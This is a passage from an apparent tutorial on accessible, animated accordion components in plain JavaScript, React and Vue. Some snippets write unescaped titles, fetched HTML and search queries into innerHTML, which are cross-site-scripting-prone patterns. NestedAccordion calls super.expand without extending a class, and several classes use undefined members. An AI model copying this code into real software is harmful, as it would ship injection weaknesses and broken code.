        e.preventDefault();
        this.accordion.panels[this.accordion.panels.length - 1].trigger.focus();
        break;
    }
  }
  
  focusNext() {
    const nextIndex = (this.index + 1) % this.accordion.panels.length;
    this.accordion.panels[nextIndex].trigger.focus();
  }
  
  focusPrevious() {
    const prevIndex = (this.index - 1 + this.accordion.panels.length) % this.accordion.panels.length;
    this.accordion.panels[prevIndex].trigger.focus();
  }
  
  toggle() {
    if (this.isExpanded) {
      this.collapse();
    } else {
      this.accordion.expand(this.index);
    }
  }
  
  expand() {
    if (this.isExpanded) return;
    
    this.isExpanded = true;
    this.trigger.setAttribute('aria-expanded', 'true');
    this.element.classList.add('is-expanded');
    
    // Animate expansion
    const height = this.contentInner.offsetHeight;
    this.content.style.height = '0px';
    
    requestAnimationFrame(() => {
      this.content.style.height = `${height}px`;
    });
    
    this.dispatchEvent('expand');
  }
  
  collapse() {
    if (!this.isExpanded) return;
    
    this.isExpanded = false;
    this.trigger.setAttribute('aria-expanded', 'false');
    
    // Animate collapse
    this.content.style.height = `${this.content.offsetHeight}px`;
    
    requestAnimationFrame(() => {
      this.content.style.height = '0px';
    });
    
    // Remove expanded class after animation
    setTimeout(() => {
      this.element.classList.remove('is-expanded');
    }, this.accordion.options.animationDuration);
    
    this.dispatchEvent('collapse');
  }
  
  dispatchEvent(type) {
    const event = new CustomEvent(`accordion:${type}`, {
      detail: { index: this.index, panel: this }
    });
    this.element.dispatchEvent(event);
  }
  
  destroy() {
    this.trigger.removeEventListener('click', this.handleClick);
    this.trigger.removeEventListener('keydown', this.handleKeydown);
  }
}
```

### Animation Strategies

#### Height-Based Animation

The most common approach calculates content height and animates the container.

```javascript
class HeightAnimator {
  constructor(element, duration = 300) {
    this.element = element;
    this.duration = duration;
    this.isAnimating = false;
  }
  
  expand(content) {
    if (this.isAnimating) return;
    this.isAnimating = true;
    
    const targetHeight = content.scrollHeight;
    
    this.element.style.height = '0px';
    this.element.style.overflow = 'hidden';
    this.element.style.transition = `height ${this.duration}ms ease-in-out`;
    
    requestAnimationFrame(() => {
      this.element.style.height = `${targetHeight}px`;
    });
    
    const handleTransitionEnd = () => {
      this.element.style.height = 'auto';
      this.element.style.overflow = '';
      this.isAnimating = false;
      this.element.removeEventListener('transitionend', handleTransitionEnd);
    };
    
    this.element.addEventListener('transitionend', handleTransitionEnd);
  }
  
  collapse() {
    if (this.isAnimating) return;
    this.isAnimating = true;
    
    const currentHeight = this.element.offsetHeight;
    
    this.element.style.height = `${currentHeight}px`;
    this.element.style.overflow = 'hidden';
    this.element.style.transition = `height ${this.duration}ms ease-in-out`;
    
    requestAnimationFrame(() => {
      this.element.style.height = '0px';
    });
    
    const handleTransitionEnd = () => {
      this.element.style.overflow = '';
      this.isAnimating = false;
      this.element.removeEventListener('transitionend', handleTransitionEnd);
    };
    
    this.element.addEventListener('transitionend', handleTransitionEnd);
  }
}
```

#### Grid-Based Animation

Uses CSS Grid's `grid-template-rows` for smoother animations without calculating heights.

```css
.accordion-content {
  display: grid;
  grid-template-rows: 0fr;
  transition: grid-template-rows 300ms ease-in-out;
  overflow: hidden;
}

.accordion-content.is-expanded {
  grid-template-rows: 1fr;
}

.accordion-content-inner {
  min-height: 0; /* Important for grid animation */
}
```

```javascript
class GridAnimator {
  expand(element) {
    element.classList.add('is-expanded');
  }
  
  collapse(element) {
    element.classList.remove('is-expanded');
  }
}
```

#### Web Animations API

Provides more control over animation lifecycle and performance.

```javascript
class WebAnimator {
  constructor(duration = 300, easing = 'ease-in-out') {
    this.duration = duration;
    this.easing = easing;
    this.currentAnimation = null;
  }
  
  expand(element, content) {
    if (this.currentAnimation) {
      this.currentAnimation.cancel();
    }
    
    const startHeight = element.offsetHeight;
    const endHeight = content.scrollHeight;
    
    this.currentAnimation = element.animate([
      { height: `${startHeight}px`, overflow: 'hidden' },
      { height: `${endHeight}px`, overflow: 'hidden' }
    ], {
      duration: this.duration,
      easing: this.easing,
      fill: 'forwards'
    });
    
    this.currentAnimation.onfinish = () => {
      element.style.height = 'auto';
      element.style.overflow = '';
      this.currentAnimation = null;
    };
    
    return this.currentAnimation.finished;
  }
  
  collapse(element) {
    if (this.currentAnimation) {
      this.currentAnimation.cancel();
    }
    
    const startHeight = element.offsetHeight;
    
    this.currentAnimation = element.animate([
      { height: `${startHeight}px`, overflow: 'hidden' },
      { height: '0px', overflow: 'hidden' }
    ], {
      duration: this.duration,
      easing: this.easing,
      fill: 'forwards'
    });
    
    this.currentAnimation.onfinish = () => {
      this.currentAnimation = null;
    };
    
    return this.currentAnimation.finished;
  }
}
```

#### Max-Height Technique

Uses `max-height` with a sufficiently large value, simpler but less precise.

```css
.accordion-content {
  max-height: 0;
  overflow: hidden;
  transition: max-height 300ms ease-in-out;
}

.accordion-content.is-expanded {
  max-height: 5000px; /* Large enough for content */
}
```

**[Inference]** This technique can cause timing issues if content exceeds the max-height value or creates unnecessarily long animations for small content due to the large transition range.

### Accessibility Implementation

#### ARIA Attributes

Proper ARIA attributes communicate accordion state to assistive technologies.

```javascript
class AccessibleAccordion {
  setupPanel(trigger, content, index) {
    // Unique IDs
    const triggerId = `accordion-trigger-${this.id}-${index}`;
    const contentId = `accordion-content-${this.id}-${index}`;
    
    // Trigger attributes
    trigger.id = triggerId;
    trigger.setAttribute('aria-expanded', 'false');
    trigger.setAttribute('aria-controls', contentId);
    
    // Content attributes
    content.id = contentId;
    content.setAttribute('role', 'region');
    content.setAttribute('aria-labelledby', triggerId);
    content.setAttribute('hidden', ''); // Native hidden attribute
  }
  
  expandPanel(trigger, content) {
    trigger.setAttribute('aria-expanded', 'true');
    content.removeAttribute('hidden');
  }
  
  collapsePanel(trigger, content) {
    trigger.setAttribute('aria-expanded', 'false');
    content.setAttribute('hidden', '');
  }
}
```

#### Keyboard Navigation

Full keyboard support follows WAI-ARIA Authoring Practices.

```javascript
class KeyboardNavigableAccordion {
  handleKeyDown(e, currentIndex) {
    const triggers = this.getAllTriggers();
    let targetIndex = currentIndex;
    
    switch(e.key) {
      case 'ArrowDown':
        e.preventDefault();
        targetIndex = (currentIndex + 1) % triggers.length;
        triggers[targetIndex].focus();
        break;
        
      case 'ArrowUp':
        e.preventDefault();
        targetIndex = (currentIndex - 1 + triggers.length) % triggers.length;
        triggers[targetIndex].focus();
        break;
        
      case 'Home':
        e.preventDefault();
        triggers[0].focus();
        break;
        
      case 'End':
        e.preventDefault();
        triggers[triggers.length - 1].focus();
        break;
        
      case 'Enter':
      case ' ':
        e.preventDefault();
        this.toggle(currentIndex);
        break;
    }
  }
  
  getAllTriggers() {
    return Array.from(this.element.querySelectorAll('[data-accordion-trigger]'));
  }
}
```

#### Focus Management

Manage focus appropriately during expansion/collapse operations.

```javascript
class FocusManagingAccordion {
  expandPanel(panelIndex) {
    const panel = this.panels[panelIndex];
    const trigger = panel.trigger;
    const content = panel.content;
    
    // Expand animation
    this.animator.expand(content);
    
    // Focus remains on trigger after expansion
    trigger.focus();
    
    // Optional: scroll expanded content into view
    if (this.options.scrollIntoView) {
      requestAnimationFrame(() => {
        content.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
      });
    }
  }
  
  collapsePanel(panelIndex) {
    const panel = this.panels[panelIndex];
    const trigger = panel.trigger;
    const content = panel.content;
    
    // If focus is inside content, move to trigger
    if (content.contains(document.activeElement)) {
      trigger.focus();
    }
    
    this.animator.collapse(content);
  }
}
```

#### Screen Reader Announcements

Provide feedback for dynamic state changes.

```javascript
class AnnouncingAccordion {
  constructor(element, options = {}) {
    this.element = element;
    this.options = options;
    this.liveRegion = this.createLiveRegion();
  }
  
  createLiveRegion() {
    const region = document.createElement('div');
    region.setAttribute('role', 'status');
    region.setAttribute('aria-live', 'polite');
    region.setAttribute('aria-atomic', 'true');
    region.className = 'sr-only';
    document.body.appendChild(region);
    return region;
  }
  
  announce(message) {
    this.liveRegion.textContent = '';
    requestAnimationFrame(() => {
      this.liveRegion.textContent = message;
    });
  }
  
  expandPanel(index) {
    const panel = this.panels[index];
    panel.expand();
    
    const label = panel.trigger.textContent.trim();
    this.announce(`${label} expanded`);
  }
  
  collapsePanel(index) {
    const panel = this.panels[index];
    panel.collapse();
    
    const label = panel.trigger.textContent.trim();
    this.announce(`${label} collapsed`);
  }
  
  destroy() {
    if (this.liveRegion && this.liveRegion.parentNode) {
      this.liveRegion.parentNode.removeChild(this.liveRegion);
    }
  }
}
```

### Performance Optimization

#### Virtual Scrolling for Large Lists

Render only visible accordion panels to reduce DOM nodes.

```javascript
class VirtualAccordion {
  constructor(element, items, options = {}) {
    this.element = element;
    this.items = items;
    this.options = {
      itemHeight: 60,
      bufferSize: 5,
      ...options
    };
    
    this.scrollContainer = element.querySelector('[data-scroll-container]');
    this.contentContainer = element.querySelector('[data-content-container]');
    
    this.visibleRange = { start: 0, end: 0 };
    this.renderedPanels = new Map();
    
    this.init();
  }
  
  init() {
    this.updateTotalHeight();
    this.updateVisibleRange();
    this.render();
    
    this.scrollContainer.addEventListener('scroll', () => {
      this.updateVisibleRange();
      this.render();
    });
  }
  
  updateTotalHeight() {
    const totalHeight = this.items.length * this.options.itemHeight;
    this.contentContainer.style.height = `${totalHeight}px`;
  }
  
  updateVisibleRange() {
    const scrollTop = this.scrollContainer.scrollTop;
    const containerHeight = this.scrollContainer.clientHeight;
    
    const start = Math.max(0, 
      Math.floor(scrollTop / this.options.itemHeight) - this.options.bufferSize
    );
    
    const end = Math.min(this.items.length,
      Math.ceil((scrollTop + containerHeight) / this.options.itemHeight) + this.options.bufferSize
    );
    
    this.visibleRange = { start, end };
  }
  
  render() {
    const { start, end } = this.visibleRange;
    
    // Remove panels outside visible range
    for (const [index, panel] of this.renderedPanels) {
      if (index < start || index >= end) {
        panel.element.remove();
        panel.destroy();
        this.renderedPanels.delete(index);
      }
    }
    
    // Add panels in visible range
    for (let i = start; i < end; i++) {
      if (!this.renderedPanels.has(i)) {
        const panelElement = this.createPanel(this.items[i], i);
        this.contentContainer.appendChild(panelElement);
        this.renderedPanels.set(i, { element: panelElement });
      }
    }
  }
  
  createPanel(item, index) {
    const panel = document.createElement('div');
    panel.className = 'accordion-panel';
    panel.style.position = 'absolute';
    panel.style.top = `${index * this.options.itemHeight}px`;
    panel.style.left = '0';
    panel.style.right = '0';
    
    panel.innerHTML = `
      <button class="accordion-trigger">${item.title}</button>
      <div class="accordion-content">${item.content}</div>
    `;
    
    return panel;
  }
}
```

#### Content Lazy Loading

Load panel content only when expanded, reducing initial payload.

```javascript
class LazyLoadAccordion {
  constructor(element, options = {}) {
    this.element = element;
    this.options = {
      loadingTemplate: '<div class="loading">Loading...</div>',
      errorTemplate: '<div class="error">Failed to load content</div>',
      ...options
    };
    
    this.panels = new Map();
    this.init();
  }
  
  async expandPanel(index) {
    const panel = this.panels.get(index);
    if (!panel) return;
    
    const content = panel.content;
    const dataSource = content.dataset.source;
    
    // Check if content already loaded
    if (content.dataset.loaded === 'true') {
      this.animator.expand(content);
      return;
    }
    
    // Show loading state
    content.innerHTML = this.options.loadingTemplate;
    this.animator.expand(content);
    
    try {
      const data = await this.fetchContent(dataSource);
      content.innerHTML = this.renderContent(data);
      content.dataset.loaded = 'true';
    } catch (error) {
      content.innerHTML = this.options.errorTemplate;
      console.error('Failed to load accordion content:', error);
    }
  }
  
  async fetchContent(source) {
    const response = await fetch(source);
    if (!response.ok) {
      throw new Error(`HTTP error ${response.status}`);
    }
    return response.json();
  }
  
  renderContent(data) {
    // Render loaded data
    return data.html;
  }
}
```

#### Debounced Resize Handling

Optimize resize calculations for responsive accordions.

```javascript
class ResponsiveAccordion {
  constructor(element, options = {}) {
    this.element = element;
    this.options = options;
    
    this.resizeObserver = new ResizeObserver(
      this.debounce(this.handleResize.bind(this), 150)
    );
    
    this.resizeObserver.observe(this.element);
  }
  
  handleResize(entries) {
    for (const entry of entries) {
      // Recalculate heights for expanded panels
      this.panels.forEach(panel => {
        if (panel.isExpanded) {
          this.updatePanelHeight(panel);
        }
      });
    }
  }
  
  updatePanelHeight(panel) {
    const content = panel.content;
    const inner = panel.contentInner;
    
    if (panel.isExpanded) {
      const newHeight = inner.offsetHeight;
      content.style.height = `${newHeight}px`;
    }
  }
  
  debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        func(...args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }
  
  destroy() {
    this.resizeObserver.disconnect();
  }
}
```

#### RequestAnimationFrame Batching

Batch DOM operations for smoother animations.

```javascript
class BatchedAccordion {
  constructor(element) {
    this.element = element;
    this.pendingUpdates = new Set();
    this.rafId = null;
  }
  
  scheduleUpdate(panel, operation) {
    this.pendingUpdates.add({ panel, operation });
    
    if (!this.rafId) {
      this.rafId = requestAnimationFrame(() => {
        this.processBatch();
      });
    }
  }
  
  processBatch() {
    // Batch read operations
    const measurements = new Map();
    for (const { panel } of this.pendingUpdates) {
      if (panel.isExpanded) {
        measurements.set(panel, panel.contentInner.offsetHeight);
      }
    }
    
    // Batch write operations
    for (const { panel, operation } of this.pendingUpdates) {
      if (operation === 'expand') {
        const height = measurements.get(panel);
        panel.content.style.height = `${height}px`;
      } else if (operation === 'collapse') {
        panel.content.style.height = '0px';
      }
    }
    
    this.pendingUpdates.clear();
    this.rafId = null;
  }
  
  expand(panel) {
    this.scheduleUpdate(panel, 'expand');
  }
  
  collapse(panel) {
    this.scheduleUpdate(panel, 'collapse');
  }
}
```

### State Management Patterns

#### Single Source of Truth

Centralize accordion state for predictable behavior.

```javascript
class StatefulAccordion {
  constructor(element, options = {}) {
    this.element = element;
    this.options = options;
    
    // Centralized state
    this.state = {
      expandedIndices: new Set(),
      focusedIndex: null,
      disabledIndices: new Set()
    };
    
    this.listeners = new Set();
  }
  
  getState() {
    return {
      expandedIndices: Array.from(this.state.expandedIndices),
      focusedIndex: this.state.focusedIndex,
      disabledIndices: Array.from(this.state.disabledIndices)
    };
  }
  
  setState(updates) {
    const prevState = this.getState();
    
    if (updates.expandedIndices !== undefined) {
      this.state.expandedIndices = new Set(updates.expandedIndices);
    }
    
    if (updates.focusedIndex !== undefined) {
      this.state.focusedIndex = updates.focusedIndex;
    }
    
    if (updates.disabledIndices !== undefined) {
      this.state.disabledIndices = new Set(updates.disabledIndices);
    }
    
    this.notifyListeners(prevState, this.getState());
    this.syncUI();
  }
  
  subscribe(callback) {
    this.listeners.add(callback);
    return () => this.listeners.delete(callback);
  }
  
  notifyListeners(prevState, newState) {
    for (const listener of this.listeners) {
      listener(newState, prevState);
    }
  }
  
  syncUI() {
    this.panels.forEach((panel, index) => {
      const shouldBeExpanded = this.state.expandedIndices.has(index);
      const isDisabled = this.state.disabledIndices.has(index);
      
      if (shouldBeExpanded !== panel.isExpanded) {
        if (shouldBeExpanded) {
          panel.expand();
        } else {
          panel.collapse();
        }
      }
      
      panel.trigger.disabled = isDisabled;
    });
  }
  
  toggle(index) {
    if (this.state.disabledIndices.has(index)) return;
    
    const expanded = new Set(this.state.expandedIndices);
    
    if (expanded.has(index)) {
      expanded.delete(index);
    } else {
      if (!this.options.allowMultiple) {
        expanded.clear();
      }
      expanded.add(index);
    }
    
    this.setState({ expandedIndices: Array.from(expanded) });
  }
}
```

#### URL State Synchronization

Sync accordion state with URL for bookmarkable/shareable states.

```javascript
class URLSyncedAccordion extends StatefulAccordion {
  constructor(element, options = {}) {
    super(element, options);
    
    this.urlParam = options.urlParam || 'accordion';
    
    // Initialize from URL
    this.loadFromURL();
    
    // Listen to browser navigation
    window.addEventListener('popstate', () => {
      this.loadFromURL();
    });
    
    // Update URL when state changes
    this.subscribe((newState) => {
      this.updateURL(newState);
    });
  }
  
  loadFromURL() {
    const params = new URLSearchParams(window.location.search);
    const expanded = params.get(this.urlParam);
    
    if (expanded) {
      const indices = expanded.split(',').map(Number).filter(n => !isNaN(n));
      this.setState({ expandedIndices: indices });
    }
  }
  
  updateURL(state) {
    const params = new URLSearchParams(window.location.search);
    
    if (state.expandedIndices.length > 0) {
      params.set(this.urlParam, state.expandedIndices.join(','));
    } else {
      params.delete(this.urlParam);
    }
    
    const newURL = `${window.location.pathname}?${params.toString()}`;
    window.history.replaceState({}, '', newURL);
  }
}
```

#### Local Storage Persistence

Persist accordion state across page reloads.

```javascript
class PersistentAccordion extends StatefulAccordion {
  constructor(element, options = {}) {
    super(element, options);
    
    this.storageKey = options.storageKey || `accordion-${this.element.id}`;
    
    // Load saved state
    this.loadFromStorage();
    
    // Save on state change
    this.subscribe((newState) => {
      this.saveToStorage(newState);
    });
  }
  
  loadFromStorage() {
    try {
      const saved = localStorage.getItem(this.storageKey);
      if (saved) {
        const state = JSON.parse(saved);
        this.setState({
          expandedIndices: state.expandedIndices || []
        });
      }
    } catch (error) {
      console.error('Failed to load accordion state:', error);
    }
  }
  
  saveToStorage(state) {
    try {
      localStorage.setItem(this.storageKey, JSON.stringify({
        expandedIndices: state.expandedIndices,
        timestamp: Date.now()
      }));
    } catch (error) {
      console.error('Failed to save accordion state:', error);
    }
  }
  
  clearStorage() {
    try {
      localStorage.removeItem(this.storageKey);
    } catch (error) {
      console.error('Failed to clear accordion state:', error);
    }
  }
}
```

### Advanced Features

#### Nested Accordions

Handle parent-child accordion relationships properly.

```javascript
class NestedAccordion {
  constructor(element, options = {}) {
    this.element = element;
    this.options = options;
    this.parent = null;
    this.children = [];
    
    // Find parent accordion
    let parentElement = element.parentElement;
    while (parentElement) {
      if (parentElement.hasAttribute('data-accordion')) {
        this.parent = parentElement.__accordion__;
        if (this.parent) {
          this.parent.registerChild(this);
        }
        break;
      }
      parentElement = parentElement.parentElement;
    }
    
    this.element.__accordion__ = this;
  }
  
  registerChild(child) {
    this.children.push(child);
  }
  
  expand(index) {
    // Expand in parent accordion first
    if (this.parent) {
      const parentPanel = this.findContainingPanel();
      if (parentPanel) {
        this.parent.expand(parentPanel.index);
      }
    }
    
    // Then expand own panel
    super.expand(index);
  }
  
  findContainingPanel() {
    if (!this.parent) return null;
    
    return this.parent.panels.find(panel => 
      panel.content.contains(this.element)
    );
  }
  
  collapseAll() {
    // Collapse all children first
    this.children.forEach(child => child.collapseAll());
    
    // Then collapse own panels
    this.panels.forEach((panel, index) => {
      this.collapse(index);
    });
  }
}
```

#### Search/Filter Functionality

Filter accordion panels based on search input.

```javascript
class SearchableAccordion {
    constructor(element, options = {}) {
        this.element = element;
        this.options = {
            searchSelector: '[data-accordion-search]',
            highlightClass: 'search-highlight',
            ...options,
        };

        this.searchInput = element.querySelector(
            this.options.searchSelector
        );
        this.allPanels = [];
        this.filteredIndices = new Set();

        if (this.searchInput) {
            this.setupSearch();
        }
    }

    setupSearch() {
        this.handleSearch = this.debounce(
            this.performSearch.bind(this),
            300
        );
        this.searchInput.addEventListener(
            'input',
            this.handleSearch
        );
    }

    performSearch(e) {
        const query = e.target.value
            .toLowerCase()
            .trim();

        if (!query) {
            this.clearSearch();
            return;
        }

        this.filteredIndices.clear();

        this.allPanels.forEach((panel, index) => {
            const triggerText =
                panel.trigger.textContent.toLowerCase();
            const contentText =
                panel.content.textContent.toLowerCase();

            if (
                triggerText.includes(query) ||
                contentText.includes(query)
            ) {
                this.filteredIndices.add(index);
                panel.element.style.display = '';
                this.highlightMatches(panel, query);
            } else {
                panel.element.style.display = 'none';
            }
        });

        // Auto-expand matching panels
        if (this.options.autoExpandOnSearch) {
            this.filteredIndices.forEach(index => {
                this.expand(index);
            });
        }

        this.announceResults();
    }

    highlightMatches(panel, query) {
        const highlight = text => {
            const regex = new RegExp(
                `(${query})`,
                'gi'
            );
            return text.replace(
                regex,
                `<mark class="${this.options.highlightClass}">$1</mark>`
            );
        };

        // Store original text if not already stored
        if (!panel.originalTriggerHTML) {
            panel.originalTriggerHTML =
                panel.trigger.innerHTML;
            panel.originalContentHTML =
                panel.content.innerHTML;
        }

        panel.trigger.innerHTML = highlight(
            panel.originalTriggerHTML
        );
    }

    clearSearch() {
        this.filteredIndices.clear();

        this.allPanels.forEach(panel => {
            panel.element.style.display = '';

            if (panel.originalTriggerHTML) {
                panel.trigger.innerHTML =
                    panel.originalTriggerHTML;
            }
        });
    }

    announceResults() {
        const count = this.filteredIndices.size;
        const message =
            count === 0
                ? 'No results found'
                : `${count} result${
                      count === 1 ? '' : 's'
                  } found`;

        if (this.liveRegion) {
            this.liveRegion.textContent = message;
        }
    }

    debounce(func, wait) {
        let timeout;
        return function (...args) {
            clearTimeout(timeout);
            timeout = setTimeout(
                () => func.apply(this, args),
                wait
            );
        };
    }
}
````

#### Drag-to-Reorder
Allow users to reorder accordion panels via drag and drop.

```javascript
class ReorderableAccordion {
  constructor(element, options = {}) {
    this.element = element;
    this.options = {
      dragHandleSelector: '[data-drag-handle]',
      onReorder: null,
      ...options
    };
    
    this.draggedPanel = null;
    this.draggedOverPanel = null;
    
    this.setupDragAndDrop();
  }
  
  setupDragAndDrop() {
    this.panels.forEach((panel, index) => {
      const handle = panel.element.querySelector(this.options.dragHandleSelector);
      
      if (handle) {
        handle.setAttribute('draggable', 'true');
        handle.addEventListener('dragstart', (e) => this.handleDragStart(e, panel));
        handle.addEventListener('dragend', (e) => this.handleDragEnd(e));
      }
      
      panel.element.addEventListener('dragover', (e) => this.handleDragOver(e, panel));
      panel.element.addEventListener('drop', (e) => this.handleDrop(e, panel));
      panel.element.addEventListener('dragleave', (e) => this.handleDragLeave(e));
    });
  }
  
  handleDragStart(e, panel) {
    this.draggedPanel = panel;
    panel.element.classList.add('is-dragging');
    e.dataTransfer.effectAllowed = 'move';
    e.dataTransfer.setData('text/html', panel.element.innerHTML);
  }
  
  handleDragEnd(e) {
    if (this.draggedPanel) {
      this.draggedPanel.element.classList.remove('is-dragging');
      this.draggedPanel = null;
    }
    
    this.panels.forEach(p => {
      p.element.classList.remove('drag-over');
    });
  }
  
  handleDragOver(e, panel) {
    if (e.preventDefault) {
      e.preventDefault();
    }
    
    e.dataTransfer.dropEffect = 'move';
    
    if (panel !== this.draggedPanel) {
      panel.element.classList.add('drag-over');
      this.draggedOverPanel = panel;
    }
    
    return false;
  }
  
  handleDragLeave(e) {
    e.target.classList.remove('drag-over');
  }
  
  handleDrop(e, targetPanel) {
    if (e.stopPropagation) {
      e.stopPropagation();
    }
    
    if (this.draggedPanel && this.draggedPanel !== targetPanel) {
      // Reorder in DOM
      const draggedElement = this.draggedPanel.element;
      const targetElement = targetPanel.element;
      
      if (this.panels.indexOf(targetPanel) < this.panels.indexOf(this.draggedPanel)) {
        targetElement.parentNode.insertBefore(draggedElement, targetElement);
      } else {
        targetElement.parentNode.insertBefore(draggedElement, targetElement.nextSibling);
      }
      
      // Update panels array
      this.updatePanelOrder();
      
      // Notify callback
      if (this.options.onReorder) {
        this.options.onReorder(this.getPanelOrder());
      }
    }
    
    return false;
  }
  
  updatePanelOrder() {
    const elements = Array.from(this.element.querySelectorAll('[data-accordion-panel]'));
    this.panels = elements.map(el => this.panels.find(p => p.element === el));
    
    // Update indices
    this.panels.forEach((panel, index) => {
      panel.index = index;
    });
  }
  
  getPanelOrder() {
    return this.panels.map(panel => ({
      index: panel.index,
      id: panel.element.id || null
    }));
  }
}
````

#### Group/Category Management

Organize panels into collapsible groups.

```javascript
class GroupedAccordion {
  constructor(element, options = {}) {
    this.element = element;
    this.options = options;
    
    this.groups = new Map();
    this.initializeGroups();
  }
  
  initializeGroups() {
    const groupElements = this.element.querySelectorAll('[data-accordion-group]');
    
    groupElements.forEach((groupElement, groupIndex) => {
      const groupId = groupElement.dataset.accordionGroup;
      const groupToggle = groupElement.querySelector('[data-group-toggle]');
      const panels = Array.from(groupElement.querySelectorAll('[data-accordion-panel]'));
      
      const group = {
        id: groupId,
        element: groupElement,
        toggle: groupToggle,
        panels: panels,
        isExpanded: groupElement.dataset.expanded === 'true'
      };
      
      this.groups.set(groupId, group);
      
      if (groupToggle) {
        groupToggle.addEventListener('click', () => {
          this.toggleGroup(groupId);
        });
      }
    });
  }
  
  toggleGroup(groupId) {
    const group = this.groups.get(groupId);
    if (!group) return;
    
    group.isExpanded = !group.isExpanded;
    
    if (group.isExpanded) {
      group.element.classList.add('is-expanded');
      group.toggle.setAttribute('aria-expanded', 'true');
    } else {
      group.element.classList.remove('is-expanded');
      group.toggle.setAttribute('aria-expanded', 'false');
      
      // Collapse all panels in group
      group.panels.forEach(panel => {
        const index = this.getPanelIndex(panel);
        if (index !== -1) {
          this.collapse(index);
        }
      });
    }
  }
  
  expandGroup(groupId) {
    const group = this.groups.get(groupId);
    if (!group || group.isExpanded) return;
    
    this.toggleGroup(groupId);
  }
  
  collapseGroup(groupId) {
    const group = this.groups.get(groupId);
    if (!group || !group.isExpanded) return;
    
    this.toggleGroup(groupId);
  }
  
  getPanelIndex(panelElement) {
    return this.panels.findIndex(p => p.element === panelElement);
  }
}
```

### Framework Integration Examples

#### React Implementation

```jsx
import React, { useState, useRef, useEffect } from 'react';

const AccordionContext = React.createContext();

function Accordion({ children, allowMultiple = false, defaultExpanded = [] }) {
  const [expandedIndices, setExpandedIndices] = useState(new Set(defaultExpanded));
  
  const toggle = (index) => {
    setExpandedIndices(prev => {
      const next = new Set(prev);
      
      if (next.has(index)) {
        next.delete(index);
      } else {
        if (!allowMultiple) {
          next.clear();
        }
        next.add(index);
      }
      
      return next;
    });
  };
  
  const value = {
    expandedIndices,
    toggle,
    allowMultiple
  };
  
  return (
    <AccordionContext.Provider value={value}>
      <div className="accordion" role="presentation">
        {React.Children.map(children, (child, index) => 
          React.cloneElement(child, { index })
        )}
      </div>
    </AccordionContext.Provider>
  );
}

function AccordionPanel({ index, children }) {
  const { expandedIndices, toggle } = React.useContext(AccordionContext);
  const isExpanded = expandedIndices.has(index);
  
  const contentRef = useRef(null);
  const [height, setHeight] = useState(0);
  
  useEffect(() => {
    if (isExpanded && contentRef.current) {
      setHeight(contentRef.current.scrollHeight);
    } else {
      setHeight(0);
    }
  }, [isExpanded]);
  
  const triggerId = `accordion-trigger-${index}`;
  const contentId = `accordion-content-${index}`;
  
  return (
    <div className={`accordion-panel ${isExpanded ? 'is-expanded' : ''}`}>
      {React.Children.map(children, child => {
        if (child.type === AccordionTrigger) {
          return React.cloneElement(child, {
            onClick: () => toggle(index),
            'aria-expanded': isExpanded,
            'aria-controls': contentId,
            id: triggerId
          });
        }
        
        if (child.type === AccordionContent) {
          return React.cloneElement(child, {
            ref: contentRef,
            style: { height: `${height}px` },
            'aria-labelledby': triggerId,
            id: contentId,
            hidden: !isExpanded
          });
        }
        
        return child;
      })}
    </div>
  );
}

function AccordionTrigger({ children, onClick, ...props }) {
  return (
    <button
      className="accordion-trigger"
      onClick={onClick}
      {...props}
    >
      {children}
    </button>
  );
}

const AccordionContent = React.forwardRef(({ children, ...props }, ref) => {
  return (
    <div
      ref={ref}
      className="accordion-content"
      role="region"
      {...props}
    >
      <div className="accordion-content-inner">
        {children}
      </div>
    </div>
  );
});

// Usage
function App() {
  return (
    <Accordion defaultExpanded={[0]} allowMultiple={false}>
      <AccordionPanel>
        <AccordionTrigger>Panel 1</AccordionTrigger>
        <AccordionContent>Content 1</AccordionContent>
      </AccordionPanel>
      
      <AccordionPanel>
        <AccordionTrigger>Panel 2</AccordionTrigger>
        <AccordionContent>Content 2</AccordionContent>
      </AccordionPanel>
    </Accordion>
  );
}
```

#### Vue 3 Implementation

```vue
<!-- Accordion.vue -->
<template>
  <div class="accordion" role="presentation">
    <slot></slot>
  </div>
</template>

<script setup>
import { provide, ref } from 'vue';

const props = defineProps({
  allowMultiple: {
    type: Boolean,
    default: false
  },
  modelValue: {
    type: Array,
    default: () => []
  }
});

const emit = defineEmits(['update:modelValue']);

const expandedIndices = ref(new Set(props.modelValue));

const toggle = (index) => {
  const next = new Set(expandedIndices.value);
  
  if (next.has(index)) {
    next.delete(index);
  } else {
    if (!props.allowMultiple) {
      next.clear();
    }
    next.add(index);
  }
  
  expandedIndices.value = next;
  emit('update:modelValue', Array.from(next));
};

provide('accordion', {
  expandedIndices,
  toggle
});
</script>

<!-- AccordionPanel.vue -->
<template>
  <div 
    class="accordion-panel"
    :class="{ 'is-expanded': isExpanded }"
  >
    <button
      :id="triggerId"
      class="accordion-trigger"
      :aria-expanded="isExpanded"
      :aria-controls="contentId"
      @click="handleToggle"
    >
      <slot name="trigger"></slot>
    </button>
    
    <div
      :id="contentId"
      ref="contentRef"
      class="accordion-content"
      role="region"
      :aria-labelledby="triggerId"
      :style="{ height: contentHeight }"
    >
      <div ref="innerRef" class="accordion-content-inner">
        <slot name="content"></slot>
      </div>
    </div>
  </div>
</template>

<script setup>
import { inject, computed, ref, watch, onMounted } from 'vue';

const props = defineProps({
  index: {
    type: Number,
    required: true
  }
});

const accordion = inject('accordion');
const contentRef = ref(null);
const innerRef = ref(null);

const isExpanded = computed(() => 
  accordion.expandedIndices.value.has(props.index)
);

const triggerId = computed(() => `accordion-trigger-${props.index}`);
const contentId = computed(() => `accordion-content-${props.index}`);

const contentHeight = ref('0px');

watch(isExpanded, (expanded) => {
  if (expanded && innerRef.value) {
    contentHeight.value = `${innerRef.value.scrollHeight}px`;
  } else {
    contentHeight.value = '0px';
  }
});

const handleToggle = () => {
  accordion.toggle(props.index);
};

onMounted(() => {
  if (isExpanded.value && innerRef.value) {
    contentHeight.value = `${innerRef.value.scrollHeight}px`;
  }
});
</script>

<!-- Usage -->
<template>
  <Accordion v-model="expanded" :allow-multiple="true">
    <AccordionPanel :index="0">
      <template #trigger>Panel 1</template>
      <template #content>Content 1</template>
    </AccordionPanel>
    
    <AccordionPanel :index="1">
      <template #trigger>Panel 2</template>
      <template #content>Content 2</template>
    </AccordionPanel>
  </Accordion>
</template>

<script setup>
import { ref } from 'vue';

const expanded = ref([0]);
</script>
```

### Testing Strategies

#### Unit Tests

